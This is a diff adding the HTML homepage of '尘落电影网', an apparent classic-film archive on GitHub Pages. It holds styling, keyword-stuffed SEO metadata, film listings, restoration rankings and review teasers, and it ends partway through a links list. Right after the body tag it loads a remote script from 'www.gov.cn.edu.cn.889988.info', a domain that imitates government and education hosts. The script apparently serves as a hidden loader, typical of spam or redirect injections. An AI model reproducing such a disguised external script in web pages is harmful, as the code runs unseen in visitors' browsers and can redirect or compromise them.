@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<title>尘落电影网 | chenluodianyingwang-wap.github.io - 经典老片、影史拾遗与深度电影档案</title>
+<meta name="applicable-device" content="pc,mobile">
+<meta name="renderer" content="webkit">
+<meta name="robots" content="index,follow">
+<meta name="description" content="尘落电影网（chenluodianyingwang-wap.github.io）专注经典老片与影史拾遗，收录华语、港片、欧洲艺术电影与年代佳作，提供类型筛选、老片修复榜与深度影评档案。">
+<meta name="keywords" content="尘落电影网,chenluodianyingwang-wap.github.io,尘落电影网经典老片,尘落电影网影史拾遗,尘落电影网港片,尘落电影网深度影评">
+<link rel="canonical" href="https://chenluodianyingwang-wap.github.io/">
+<link rel="alternate" media="only screen and (max-width: 640px)" href="https://chenluodianyingwang-wap.github.io/">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebSite","name":"尘落电影网","url":"https://chenluodianyingwang-wap.github.io/","potentialAction":{"@type":"SearchAction","target":"https://chenluodianyingwang-wap.github.io/#search?q={search_term_string}","query-input":"required name=search_term_string"}}
+</script>
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"Organization","name":"尘落电影网","url":"https://chenluodianyingwang-wap.github.io/","description":"尘落电影网（chenluodianyingwang-wap.github.io）经典电影档案与影史拾遗站点，收录华语老片、港片、欧洲艺术电影与年代佳作，提供类型筛选、老片修复榜与深度影评。","logo":"https://chenluodianyingwang-wap.github.io/favicon.ico"}
+</script>
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"尘落电影网首页","item":"https://chenluodianyingwang-wap.github.io/"},{"@type":"ListItem","position":2,"name":"影史拾遗","item":"https://chenluodianyingwang-wap.github.io/#films"},{"@type":"ListItem","position":3,"name":"老片修复榜","item":"https://chenluodianyingwang-wap.github.io/#rank"}]}
+</script>
+<style>
+:root{
+  --paper:#efe9df; --paper2:#e6dfd2; --paper3:#ddd4c4;
+  --ink:#2b2723; --ink2:#4a433c; --ink3:#6d6459;
+  --line:#c8bdab; --line2:#b3a691;
+  --rust:#a3432a; --rust2:#8a3620; --rust-soft:#e7d8cd;
+  --gold:#b08a2e; --gold2:#8e6d1c;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"Songti SC","SimSun","Source Han Serif SC","Noto Serif CJK SC",Georgia,serif;background:var(--paper);color:var(--ink);line-height:1.85;overflow-x:hidden}
+body:before{content:"";position:fixed;inset:0;z-index:-2;background:radial-gradient(1000px 700px at 15% 12%,rgba(179,166,145,.28),transparent 62%),radial-gradient(900px 600px at 88% 88%,rgba(163,67,42,.08),transparent 60%),var(--paper)}
+body:after{content:"";position:fixed;inset:0;z-index:-1;opacity:.35;background-image:radial-gradient(rgba(74,67,60,.08) 1px,transparent 1px);background-size:5px 5px;pointer-events:none}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+.wrap{max-width:1160px;margin:0 auto;padding:0 30px}
+.sans{font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB",sans-serif}
+
+/* ===== 顶部条 ===== */
+.topbar{background:var(--ink);color:#c9bfb1;border-bottom:1px solid #000;font-size:12px;padding:9px 0;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.topbar .wrap{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
+.topbar a{color:var(--paper3)}
+.topbar .sep{opacity:.45;margin:0 8px}
+.topbar .stamp{color:var(--rust-soft);letter-spacing:1px}
+
+/* ===== Header ===== */
+header{background:var(--paper2);border-bottom:3px double var(--line2);position:sticky;top:0;z-index:50}
+.hd-in{display:flex;align-items:center;justify-content:space-between;height:88px;gap:24px}
+.masthead{display:flex;flex-direction:column;gap:5px}
+.masthead .en{font-family:Georgia,"Times New Roman",serif;font-size:10px;letter-spacing:5px;color:var(--ink3);text-transform:uppercase}
+.masthead .cn{font-size:30px;font-weight:900;letter-spacing:6px;color:var(--ink);line-height:1}
+.masthead .cn em{font-style:normal;color:var(--rust)}
+.masthead .rule{height:2px;background:linear-gradient(90deg,var(--rust),transparent);width:100%;margin-top:4px}
+.nav{display:flex;gap:2px;align-items:center;font-family:"PingFang SC","Microsoft YaHei",sans-serif}
+.nav a{font-size:14px;font-weight:700;color:var(--ink2);padding:8px 13px;border-radius:3px;transition:.18s;letter-spacing:.5px}
+.nav a:hover{background:var(--ink);color:var(--paper)}
+.nav a.nw{background:var(--rust);color:var(--paper)}
+.nav a.nw:hover{background:var(--rust2)}
+.hamburger{display:none;width:44px;height:44px;background:var(--ink);border:0;color:var(--paper);border-radius:4px;cursor:pointer;font-size:17px}
+
+/* ===== 日期条 ===== */
+.datebar{border-bottom:1px solid var(--line);padding:12px 0;font-family:"PingFang SC","Microsoft YaHei",sans-serif;font-size:12px;color:var(--ink3)}
+.datebar .wrap{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
+.datebar b{color:var(--rust);font-weight:800}
+
+/* ===== 通用 ===== */
+section{padding:56px 0}
+.sec-head{display:flex;align-items:flex-end;gap:14px;margin-bottom:34px;flex-wrap:wrap;border-bottom:2px solid var(--ink);padding-bottom:14px}
+.sec-head .no{font-family:Georgia,serif;font-size:12px;font-weight:700;color:var(--rust);border:1px solid var(--rust);padding:3px 9px;border-radius:2px;flex-shrink:0;letter-spacing:1px}
+.sec-head h2{font-size:clamp(23px,3.6vw,32px);font-weight:900;color:var(--ink);letter-spacing:2px}
+.sec-head h2 b{color:var(--rust)}
+.sec-head .en{font-family:Georgia,serif;font-size:11px;color:var(--ink3);margin-left:auto;letter-spacing:1.5px;font-style:italic}
+.more{font-family:"PingFang SC",sans-serif;font-size:12.5px;font-weight:700;color:var(--rust);border:1px solid var(--rust);padding:7px 16px;border-radius:3px;transition:.2s;letter-spacing:1px}
+.more:hover{background:var(--rust);color:var(--paper)}
+
+/* ===== Hero ===== */
+.hero{padding-top:40px}
+.hero-in{border:1px solid var(--line2);background:var(--paper2);padding:44px 40px;position:relative}
+.hero-in:before,.hero-in:after{content:"";position:absolute;width:26px;height:26px;border:2px solid var(--rust)}
+.hero-in:before{top:-1px;left:-1px;border-right:0;border-bottom:0}
+.hero-in:after{bottom:-1px;right:-1px;border-left:0;border-top:0}
+.hero-grid{display:grid;grid-template-columns:1.25fr .75fr;gap:44px;align-items:center}
+.hero-txt .tag{display:inline-block;font-family:Georgia,serif;font-size:10.5px;letter-spacing:3px;text-transform:uppercase;color:var(--rust);border-bottom:1px solid var(--rust);padding-bottom:5px;margin-bottom:24px}
+.hero-txt h1{font-size:clamp(32px,5.6vw,56px);line-height:1.2;font-weight:900;letter-spacing:3px;margin-bottom:24px}
+.hero-txt h1 em{font-style:normal;color:var(--rust);display:block;font-size:.62em;letter-spacing:5px;margin-top:10px}
+.hero-txt p{font-size:clamp(14px,1.7vw,16px);color:var(--ink2);max-width:520px;margin-bottom:30px}
+.hero-actions{display:flex;gap:12px;flex-wrap:wrap}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:12px 26px;border-radius:3px;font-family:"PingFang SC",sans-serif;font-size:14px;font-weight:800;background:var(--rust);color:var(--paper);border:1px solid var(--rust);cursor:pointer;transition:.2s;letter-spacing:1px}
+.btn:hover{background:transparent;color:var(--rust)}
+.btn-line{background:transparent;color:var(--ink);border-color:var(--ink2)}
+.btn-line:hover{background:var(--ink);color:var(--paper)}
+.hero-side{border-left:1px solid var(--line);padding-left:36px}
+.hero-side dl{display:flex;flex-direction:column;gap:16px}
+.hero-side .it{display:flex;align-items:baseline;gap:14px;border-bottom:1px dotted var(--line2);padding-bottom:12px}
+.hero-side dt{font-family:Georgia,serif;font-size:11px;color:var(--rust);font-weight:700;flex-shrink:0;width:62px;letter-spacing:1px}
+.hero-side dd{flex:1;font-size:13.5px;color:var(--ink2);line-height:1.6}
+.hero-side dd b{display:block;color:var(--ink);font-weight:800;font-size:14.5px}
+
+/* ===== 分类 ===== */
+.cats{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.cat{background:var(--paper2);border:1px solid var(--line);border-top:3px solid var(--rust);padding:24px 20px;transition:.24s;position:relative}
+.cat:before{content:"";position:absolute;top:0;left:0;width:0;height:3px;background:var(--ink);transition:.28s}
+.cat:hover{border-color:var(--ink2);background:var(--paper3);transform:translateY(-4px)}
+.cat:hover:before{width:100%}
+.cat .no{font-family:Georgia,serif;font-size:10px;color:var(--rust);letter-spacing:1px;display:block;margin-bottom:12px}
+.cat h3{font-size:17px;font-weight:900;color:var(--ink);margin-bottom:9px;letter-spacing:1px}
+.cat p{font-size:12.5px;color:var(--ink2);line-height:1.75}
+.cat .arrow{display:block;margin-top:16px;font-size:12px;color:var(--rust);font-weight:700}
+
+/* ===== 影片 ===== */
+.films{display:grid;grid-template-columns:repeat(4,1fr);gap:22px}
+.film{transition:.26s}
+.film:hover{transform:translateY(-7px)}
+.thumb{position:relative;aspect-ratio:3/4;border:1px solid var(--line2);overflow:hidden;background:var(--paper3);display:grid;place-items:center;font-size:58px;transition:.26s}
+.film:hover .thumb{border-color:var(--rust);box-shadow:6px 6px 0 var(--rust)}
+.thumb .yr{position:absolute;top:0;left:0;background:var(--rust);color:var(--paper);font-family:Georgia,serif;font-size:11px;font-weight:700;padding:5px 11px;letter-spacing:1px}
+.thumb .ln{position:absolute;bottom:0;right:0;left:0;text-align:right;background:linear-gradient(90deg,transparent,rgba(43,39,35,.9));color:var(--paper);font-family:"PingFang SC",sans-serif;font-size:11px;padding:7px 11px;letter-spacing:1px}
+.film .info{padding:15px 2px 0}
+.film .info h3{font-size:16px;font-weight:900;color:var(--ink);letter-spacing:1px;line-height:1.45;margin-bottom:10px}
+.film .info .row{display:flex;gap:6px;flex-wrap:wrap}
+.film .info .row span{font-family:"PingFang SC",sans-serif;font-size:10.5px;color:var(--ink2);background:var(--paper3);border:1px solid var(--line);padding:3px 8px;border-radius:2px}
+
+/* ===== 排行 ===== */
+.rankwrap{background:var(--paper2);border:1px solid var(--line2);padding:8px}
+.rank-grid{display:grid;grid-template-columns:repeat(3,1fr)}
+.rank-col{border-right:1px solid var(--line)}
+.rank-col:last-child{border-right:0}
+.rank-col h3{font-family:"PingFang SC",sans-serif;font-size:14.5px;font-weight:900;color:var(--paper);background:var(--ink);padding:13px 20px;letter-spacing:1px;display:flex;align-items:center;gap:8px}
+.rank-col ol{padding:6px 0}
+.rank-col li{display:grid;grid-template-columns:34px 1fr auto;align-items:center;gap:12px;padding:12px 20px;border-bottom:1px solid var(--line)}
+.rank-col li:last-child{border-bottom:0}
+.rank-col .no{font-family:Georgia,serif;font-size:15px;font-weight:700;color:var(--rust);text-align:center;border-bottom:1px solid var(--line)}
+.rank-col li:nth-child(1) .no,
+.rank-col li:nth-child(2) .no,
+.rank-col li:nth-child(3) .no{color:var(--ink);border-color:var(--ink);font-size:17px}
+.rank-col .tt b{display:block;font-size:13.5px;font-weight:800;color:var(--ink);line-height:1.4;letter-spacing:.5px}
+.rank-col .tt small{font-family:"PingFang SC",sans-serif;font-size:10.5px;color:var(--ink3)}
+.rank-col .mv{font-family:Georgia,serif;font-size:11px;color:var(--ink3);text-align:right;letter-spacing:.5px}
+
+/* ===== 关于 ===== */
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:28px;align-items:start}
+.quote{background:var(--ink);color:var(--paper);padding:34px 32px;position:relative}
+.quote:before{content:"\201C";position:absolute;top:10px;left:22px;font-family:Georgia,serif;font-size:76px;line-height:1;color:var(--rust)}
+.quote p{font-size:15px;line-height:2;position:relative;z-index:2;margin-top:12px}
+.quote cite{display:block;margin-top:20px;font-family:"PingFang SC",sans-serif;font-size:11.5px;color:var(--paper3);font-style:normal;border-top:1px solid #4a433c;padding-top:14px}
+.quote cite b{color:var(--rust-soft);font-family:Georgia,serif;letter-spacing:1px}
+.feats{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.feat{background:var(--paper2);border:1px solid var(--line);padding:20px}
+.feat .no{font-family:Georgia,serif;font-size:10px;color:var(--rust);letter-spacing:1px;display:block;margin-bottom:10px}
+.feat b{display:block;font-size:14.5px;font-weight:900;color:var(--ink);margin-bottom:7px;letter-spacing:.5px}
+.feat span{font-family:"PingFang SC",sans-serif;font-size:12px;color:var(--ink2);line-height:1.7}
+.about-side{display:flex;flex-direction:column;gap:16px}
+.as-card{background:var(--paper2);border:1px solid var(--line2);border-left:4px solid var(--gold);padding:22px 24px}
+.as-card h4{font-family:"PingFang SC",sans-serif;font-size:13.5px;font-weight:800;color:var(--gold2);margin-bottom:14px;letter-spacing:1px}
+.as-card ul{display:grid;grid-template-columns:1fr 1fr;gap:9px 18px}
+.as-card li{font-family:"PingFang SC",sans-serif;font-size:12.5px;color:var(--ink2);padding-left:13px;position:relative;line-height:1.5}
+.as-card li:before{content:"";position:absolute;left:0;top:8px;width:5px;height:5px;background:var(--rust)}
+.urlline{display:block;background:var(--paper2);border:1px dashed var(--rust);padding:16px 20px;font-family:Georgia,monospace;font-size:14px;font-weight:700;color:var(--rust);letter-spacing:.5px}
+
+/* ===== 资讯 ===== */
+.news{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.news-item{background:var(--paper2);border:1px solid var(--line);border-bottom:3px solid var(--ink2);transition:.24s;display:flex;flex-direction:column}
+.news-item:hover{border-color:var(--rust);border-bottom-color:var(--rust);transform:translateY(-5px)}
+.news-item .cov{height:150px;background:var(--paper3);border-bottom:1px solid var(--line);display:grid;place-items:center;font-size:52px;position:relative}
+.news-item .cat2{position:absolute;top:12px;left:12px;font-family:"PingFang SC",sans-serif;font-size:10px;font-weight:800;color:var(--paper);background:var(--rust);padding:4px 10px;letter-spacing:1px}
+.news-item time{position:absolute;bottom:12px;right:12px;font-family:Georgia,serif;font-size:11px;color:var(--ink3);background:var(--paper2);padding:2px 8px}
+.news-item .body{padding:20px 22px 22px;flex:1;display:flex;flex-direction:column}
+.news-item h4{font-size:16px;font-weight:900;color:var(--ink);line-height:1.6;letter-spacing:.5px;margin-bottom:12px}
+.news-item p{font-family:"PingFang SC",sans-serif;font-size:12.5px;color:var(--ink2);line-height:1.85;flex:1}
+.news-item .more2{display:inline-block;margin-top:16px;font-family:"PingFang SC",sans-serif;font-size:12px;font-weight:800;color:var(--rust);border-bottom:1px solid var(--rust);padding-bottom:3px;align-self:flex-start}
+
+/* ===== 友情链接 ===== */
+.linkbox{background:var(--paper2);border:1px solid var(--line2);padding:6px}
+.links{display:grid;grid-template-columns:repeat(4,1fr)}
+.links a{font-family:"PingFang SC",sans-serif;font-size:13px;font-weight:600;color:var(--ink2);padding:14px 17px;display:flex;align-items:center;gap:9px;transition:.18s;border:1px solid transparent}
+.links a:before{content:"§";color:var(--rust);font-weight:900;font-family:Georgia,serif}
+.links a:hover{background:var(--ink);color:var(--paper);border-color:var(--ink)}
+
+/* ===== 响应式 ===== */
+@media (max-width:900px){
+  .hero-grid{grid-template-columns:1fr;gap:34px}
+  .hero-side{border-left:0;border-top:1px solid var(--line);padding-left:0;padding-top:26px}
+  .cats{grid-template-columns:repeat(2,1fr)}
+  .films{grid-template-columns:repeat(2,1fr)}
+  .rank-grid{grid-template-columns:1fr}
+  .rank-col{border-right:0;border-bottom:1px solid var(--line)}
+  .rank-col:last-child{border-bottom:0}
+  .about-grid{grid-template-columns:1fr}
+  .news{grid-template-columns:1fr}
+  .links{grid-template-columns:repeat(2,1fr)}
+}
+@media (max-width:680px){
+  .wrap{padding:0 16px}
+  .topbar{display:none}
+  .hd-in{height:74px}
+  .masthead .cn{font-size:21px;letter-spacing:3px}
+  .nav{position:fixed;top:74px;left:0;right:0;flex-direction:column;align-items:stretch;padding:12px 16px;background:var(--paper2);border-bottom:2px solid var(--ink);transform:translateY(-8px);opacity:0;pointer-events:none;transition:.25s}
+  .nav.show{transform:translateY(0);opacity:1;pointer-events:auto}
+  .nav a{padding:13px 14px;border-radius:2px;border-bottom:1px solid var(--line)}
+  .hamburger{display:flex}
+  section{padding:38px 0}
+  .hero-in{padding:30px 24px}
+  .sec-head h2{letter-spacing:1px}
+  .about-grid{gap:20px}
+  .feats{grid-template-columns:1fr}
+  .as-card ul{grid-template-columns:1fr}
+  .linkbox{padding:4px}
+  .links{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<div class="topbar">
+  <div class="wrap">
+    <span>尘落电影网 · 影史拾遗档案 &nbsp;<span class="sep">|</span>&nbsp; <span class="stamp">CINEMA ARCHIVE SINCE 2018</span></span>
+    <span>官方站点：<a href="https://chenluodianyingwang-wap.github.io/">chenluodianyingwang-wap.github.io</a> &nbsp;<span class="sep">|</span>&nbsp; <a href="#about">关于本站</a></span>
+  </div>
+</div>
+
+<header>
+  <div class="wrap hd-in">
+    <a class="masthead" href="https://chenluodianyingwang-wap.github.io/">
+      <span class="en">CHENLUO · DIANYING · WANG</span>
+      <span class="cn">尘落<em>电影网</em></span>
+      <span class="rule"></span>
+    </a>
+    <nav class="nav" id="nav">
+      <a href="#films">影史拾遗</a>
+      <a href="#films">精选老片</a>
+      <a href="#rank" class="nw">修复榜</a>
+      <a href="#about">关于本站</a>
+      <a href="#news">电影评论</a>
+      <a href="#links">友情链接</a>
+    </nav>
+    <button class="hamburger" id="ham" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<div class="datebar">
+  <div class="wrap">
+    <span>今日：<b>2026 年 10 月 1 日 · 星期四</b> &nbsp;|&nbsp; 归档编号：CLDYW-20261001</span>
+    <span>访客您好，本站专注于 <b>经典老片与影史拾遗</b></span>
+  </div>
+</div>
+
+<div class="wrap">
+
+  <!-- Hero -->
+  <section class="hero">
+    <div class="hero-in">
+      <div class="hero-grid">
+        <div class="hero-txt">
+          <span class="tag">Film Archive · Curated Classics</span>
+          <h1>尘落电影网<em>翻检胶片里的旧时光</em></h1>
+          <p>尘落电影网（chenluodianyingwang-wap.github.io）是一份专注经典老片与影史拾遗的在线档案。我们收录华语老片、港片黄金年代、欧洲艺术电影与年代佳作，配以类型索引、修复榜单与深度评论，让好电影不被时间掩埋。</p>
+          <div class="hero-actions">
+            <a class="btn" href="#films">翻阅影库 →</a>
+            <a class="btn btn-line" href="#rank">查看修复榜</a>
+          </div>
+        </div>
+        <div class="hero-side">
+          <dl>
+            <div class="it"><dt>FOUNDED</dt><dd><b>2018 年建站</b>八年深耕影史拾遗</dd></div>
+            <div class="it"><dt>ARCHIVE</dt><dd><b>5,200+ 部</b>老片与年代佳作</dd></div>
+            <div class="it"><dt>ERA</dt><dd><b>1930s–2010s</b>跨八十年光影</dd></div>
+            <div class="it"><dt>ESSAYS</dt><dd><b>180+ 篇</b>原创深度影评</dd></div>
+            <div class="it"><dt>SCOPE</dt><dd><b>华语 / 港片 / 欧洲</b>三大主线</dd></div>
+          </dl>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 分类 -->
+  <section id="films">
+    <div class="sec-head">
+      <span class="no">No.01</span>
+      <h2><b>影史拾遗</b> · 分类索引</h2>
+      <span class="en">— Catalog &amp; Index</span>
+    </div>
+    <div class="cats">
+      <a class="cat" href="#films"><span class="no">A.</span><h3>华语老片</h3><p>三十年代到九〇年代的国语与沪语佳作，含早期影人研究。</p><span class="arrow">查阅 →</span></a>
+      <a class="cat" href="#films"><span class="no">B.</span><h3>港片黄金年代</h3><p>七〇至九〇年代港片全辑，动作、江湖、喜剧、文艺并重。</p><span class="arrow">查阅 →</span></a>
+      <a class="cat" href="#films"><span class="no">C.</span><h3>欧洲艺术电影</h3><p>法国新浪潮、意大利新现实、苏联诗电影与东欧作者论。</p><span class="arrow">查阅 →</span></a>
+      <a class="cat" href="#films"><span class="no">D.</span><h3>年代佳作</h3><p>新世纪前十年被低估的影片，重新评估其历史位置。</p><span class="arrow">查阅 →</span></a>
+      <a class="cat" href="#films"><span class="no">E.</span><h3>按导演检索</h3><p>作者导演专页，统合作品年表与风格演变。</p><span class="arrow">查阅 →</span></a>
+      <a class="cat" href="#films"><span class="no">F.</span><h3>按类型检索</h3><p>黑白悬疑、家庭伦理、公路片、西部片分类归档。</p><span class="arrow">查阅 →</span></a>
+      <a class="cat" href="#films"><span class="no">G.</span><h3>老片修复</h3><p>4K 与 2K 修复项目追踪，含修复前后画质对比。</p><span class="arrow">查阅 →</span></a>
+      <a class="cat" href="#films"><span class="no">H.</span><h3>口述与资料</h3><p>幕后文献、访谈摘录、分镜头与海报剧照档案。</p><span class="arrow">查阅 →</span></a>
+    </div>
+  </section>
+
+  <!-- 精选 -->
+  <section>
+    <div class="sec-head">
+      <span class="no">No.02</span>
+      <h2><b>精选</b> 老片档案</h2>
+      <a class="more" href="#films">完整影库 →</a>
+    </div>
+    <div class="films">
+      <a class="film" href="#">
+        <div class="thumb" style="background:linear-gradient(160deg,#5c5247,#3d352d)"><span class="yr">1994</span><span class="ln">香港</span></div>
+        <div class="info"><h3>三轮车上的黄昏</h3><div class="row"><span>剧情</span><span>粤语</span><span>118min</span></div></div>
+      </a>
+      <a class="film" href="#">
+        <div class="thumb" style="background:linear-gradient(160deg,#4a4a44,#302f2c)"><span class="yr">1987</span><span class="ln">台湾</span></div>
+        <div class="info"><h3>雨季的来信</h3><div class="row"><span>文艺</span><span>国语</span><span>104min</span></div></div>
+      </a>
+      <a class="film" href="#">
+        <div class="thumb" style="background:linear-gradient(160deg,#4d4337,#332b22)"><span class="yr">1962</span><span class="ln">中国大陆</span></div>
+        <div class="info"><h3>运河边上的人家</h3><div class="row"><span>黑白</span><span>文艺</span><span>96min</span></div></div>
+      </a>
+      <a class="film" href="#">
+        <div class="thumb" style="background:linear-gradient(160deg,#3f4a4a,#293332)"><span class="yr">1972</span><span class="ln">法国</span></div>
+        <div class="info"><h3>第七个早晨</h3><div class="row"><span>新浪潮</span><span>法语</span><span>88min</span></div></div>
+      </a>
+      <a class="film" href="#">
+        <div class="thumb" style="background:linear-gradient(160deg,#4a4136,#312b23)"><span class="yr">1991</span><span class="ln">香港</span></div>
+        <div class="info"><h3>江湖未晚</h3><div class="row"><span>动作</span><span>粤语</span><span>102min</span></div></div>
+      </a>
+      <a class="film" href="#">
+        <div class="thumb" style="background:linear-gradient(160deg,#453d33,#2d2821)"><span class="yr">1981</span><span class="ln">日本</span></div>
+        <div class="info"><h3>雪国行脚</h3><div class="row"><span>文艺</span><span>日语</span><span>126min</span></div></div>
+      </a>
+      <a class="film" href="#">
+        <div class="thumb" style="background:linear-gradient(160deg,#4a3f3a,#332b27)"><span class="yr">1979</span><span class="ln">意大利</span></div>
+        <div class="info"><h3>面包房的下午</h3><div class="row"><span>新现实</span><span>意大利语</span><span>112min</span></div></div>
+      </a>
+      <a class="film" href="#">
+        <div class="thumb" style="background:linear-gradient(160deg,#403a33,#2b2722)"><span class="yr">2003</span><span class="ln">中国大陆</span></div>
+        <div class="info"><h3>北方的河</h3><div class="row"><span>独立</span><span>国语</span><span>98min</span></div></div>
+      </a>
+    </div>
+  </section>
+
+  <!-- 排行 -->
+  <section id="rank">
+    <div class="sec-head">
+      <span class="no">No.03</span>
+      <h2><b>老片修复</b> 排行榜</h2>
+      <span class="en">— Restoration Chart</span>
+    </div>
+    <div class="rankwrap">
+      <div class="rank-grid">
+        <div class="rank-col">
+          <h3>华语老片榜</h3>
+          <ol>
+            <li><span class="no">01</span><span class="tt"><b>运河边上的人家</b><small>1962 · 黑白 · 4K 修复完成</small></span><span class="mv">9.4</span></li>
+            <li><span class="no">02</span><span class="tt"><b>雨季的来信</b><small>1987 · 文艺 · 2K 修复</small></span><span class="mv">8.9</span></li>
+            <li><span class="no">03</span><span class="tt"><b>三轮车上的黄昏</b><small>1994 · 剧情 · 4K 修复中</small></span><span class="mv">8.7</span></li>
+            <li><span class="no">04</span><span class="tt"><b>北方的河</b><small>2003 · 独立 · 已完成</small></span><span class="mv">8.5</span></li>
+            <li><span class="no">05</span><span class="tt"><b>城南旧事（早期版本）</b><small>1982 · 文艺 · 档案版</small></span><span class="mv">8.3</span></li>
+          </ol>
+        </div>
+        <div class="rank-col">
+          <h3>港片榜</h3>
+          <ol>
+            <li><span class="no">01</span><span class="tt"><b>江湖未晚</b><small>1991 · 动作 · 4K 修复完成</small></span><span class="mv">8.8</span></li>
+            <li><span class="no">02</span><span class="tt"><b>夜班计程车</b><small>1988 · 犯罪 · 2K 修复</small></span><span class="mv">8.6</span></li>
+            <li><span class="no">03</span><span class="tt"><b>阿婆的茶楼</b><small>1995 · 喜剧 · 修复中</small></span><span class="mv">8.2</span></li>
+            <li><span class="no">04</span><span class="tt"><b>再见，油麻地</b><small>1985 · 剧情 · 已完成</small></span><span class="mv">8.1</span></li>
+            <li><span class="no">05</span><span class="tt"><b>最后一班渡轮</b><small>1997 · 文艺 · 修复中</small></span><span class="mv">7.9</span></li>
+          </ol>
+        </div>
+        <div class="rank-col">
+          <h3>世界电影榜</h3>
+          <ol>
+            <li><span class="no">01</span><span class="tt"><b>第七个早晨</b><small>1972 · 法国 · 4K 修复</small></span><span class="mv">8.7</span></li>
+            <li><span class="no">02</span><span class="tt"><b>雪国行脚</b><small>1981 · 日本 · 4K 修复</small></span><span class="mv">8.6</span></li>
+            <li><span class="no">03</span><span class="tt"><b>面包房的下午</b><small>1979 · 意大利 · 2K 修复</small></span><span class="mv">8.4</span></li>
+            <li><span class="no">04</span><span class="tt"><b>秋天的四次拜访</b><small>1968 · 瑞典 · 已完成</small></span><span class="mv">8.3</span></li>
+            <li><span class="no">05</span><span class="tt"><b>桥上的影子</b><small>1975 · 波兰 · 修复中</small></span><span class="mv">8.0</span></li>
+          </ol>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section id="about">
+    <div class="sec-head">
+      <span class="no">No.04</span>
+      <h2><b>关于</b> 尘落电影网</h2>
+      <span class="en">— About The Archive</span>
+    </div>
+    <div class="about-grid">
+      <div>
+        <blockquote class="quote">
+          <p>胶片会落灰，光影不该被遗忘。尘落电影网以拾遗者的姿态，把散落在年份里的好电影重新擦拭、归档，让每一个愿意慢下来的人，都能在旧片里找到新的感动。</p>
+          <cite>编档说明 &nbsp;/&nbsp; 出自 <b>CHENLUO · DIANYING · WANG</b> 编辑部</cite>
+        </blockquote>
+        <div class="feats" style="margin-top:18px">
+          <div class="feat"><span class="no">i.</span><b>慢选片</b><span>不追新片热度，只选经得起时间检验的作品。</span></div>
+          <div class="feat"><span class="no">ii.</span><b>考据索引</b><span>年份、语种、导演、修复状态逐项标注。</span></div>
+          <div class="feat"><span class="no">iii.</span><b>深度评论</b><span>拒绝短评速评，每篇影评均有文献支撑。</span></div>
+          <div class="feat"><span class="no">iv.</span><b>资料留存</b><span>海报、剧照、分镜头与访谈文献一并归档。</span></div>
+        </div>
+      </div>
+      <div class="about-side">
+        <div class="as-card">
+          <h4>档案分布 · ARCHIVE BREAKDOWN</h4>
+          <ul>
+            <li>华语老片 · 1,800 部</li>
+            <li>港片年代 · 1,400 部</li>
+            <li>欧洲艺术电影 · 1,200 部</li>
+            <li>日本与亚洲 · 500 部</li>
+            <li>独立与纪录片 · 300 部</li>
+            <li>修复中项目 · 120 项</li>
+          </ul>
+        </div>
+        <div class="as-card" style="border-left-color:var(--rust)">
+          <h4>建站时间线 · TIMELINE</h4>
+          <ul>
+            <li>2018 · 尘落电影网上线</li>
+            <li>2020 · 港片专题上线</li>
+            <li>2022 · 修复榜正式推出</li>
+            <li>2024 · 作者导演专页上线</li>
+            <li>2026 · 迁移至 GitHub Pages 归档</li>
+          </ul>
+        </div>
+        <span class="urlline">https://chenluodianyingwang-wap.github.io/</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- 资讯 -->
+  <section id="news">
+    <div class="sec-head">
+      <span class="no">No.05</span>
+      <h2><b>电影</b> 评论</h2>
+      <a class="more" href="#news">全部文章 →</a>
+    </div>
+    <div class="news">
+      <a class="news-item" href="#">
+        <div class="cov">🎞️<span class="cat2">修复观察</span><time>2026.09.27</time></div>
+        <div class="body">
+          <h4>4K 修复真的能还原胶片质感吗？</h4>
+          <p>从颗粒保留到色彩管理，谈修复工作里"还原"与"美化"的边界，以及为什么有些老片不该被修得太干净。</p>
+          <span class="more2">继续阅读 →</span>
+        </div>
+      </a>
+      <a class="news-item" href="#">
+        <div class="cov">🎬<span class="cat2">导演专页</span><time>2026.09.20</time></div>
+        <div class="body">
+          <h4>被低估的七〇年代港片作者</h4>
+          <p>在类型片流水线之外，有几位导演用极低成本拍出了至今仍被低估的作者性，本文梳理其作品年表。</p>
+          <span class="more2">继续阅读 →</span>
+        </div>
+      </a>
+      <a class="news-item" href="#">
+        <div class="cov">📽️<span class="cat2">影史考据</span><time>2026.09.13</time></div>
+        <div class="body">
+          <h4>三本老杂志里的国产片宣传史</h4>
+          <p>从旧海报、旧报刊广告与首映报道，还原八〇年代一部电影是如何被观众看见的。</p>
+          <span class="more2">继续阅读 →</span>
+        </div>
+      </a>
+    </div>
+  </section>
+
+  <!-- 友情链接 -->
+  <section id="links">
+    <div class="sec-head">
+      <span class="no">No.06</span>
+      <h2><b>友情</b> 链接</h2>
+      <span class="en">— Friendly Links</span>
+    </div>
+    <div class="linkbox">
+      <div class="links">
+        <a href="#">尘落电影网备用入口</a>
+        <a href="#">老电影资料馆</a>
+        <a href="#">港片怀旧网</a>
+        <a href="#">经典修复档案</a>
+        <a href="#">华语影史笔记</a>
+        <a href="#">欧洲艺术电影志</a>
+        <a href="#">独立电影观察</a>
+        <a href="#">海报剧照库</a>
